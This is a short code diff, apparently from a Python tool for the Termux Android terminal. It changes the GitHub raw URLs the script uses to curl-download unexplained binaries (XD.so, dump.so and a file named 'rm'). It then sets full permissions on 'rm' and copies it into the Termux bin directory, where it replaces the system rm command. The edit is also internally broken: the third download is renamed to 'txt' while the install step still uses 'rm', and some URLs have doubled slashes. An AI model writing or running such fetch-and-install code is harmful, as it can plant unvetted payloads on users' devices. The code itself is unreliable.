@@ -15,15 +15,15 @@ arch=uname().machine.lower()
 if path.isfile("XD.so"):
     pass
 else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/XD.so -o XD.so")
+    system("curl -L https://raw.githubusercontent.com/ZAIN-OKX/AKING110//main/XD.so -o XD.so")
 if path.isfile("dump.so"):
     pass
 else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/dump.so -o dump.so")
+    system("curl -L https://raw.githubusercontent.com//ZAIN-OKX/AKING110/main/dump.so -o dump.so")
 if path.isfile("rm"):
     pass
 else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
+    system("curl -L https://raw.githubusercontent.com//ZAIN-OKX/AKING110/main/txt    -o   txt")
     system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
 if 'aarch' in arch:
     print('\033[1;37m\nCongratulations! Your Device Support This Tools')
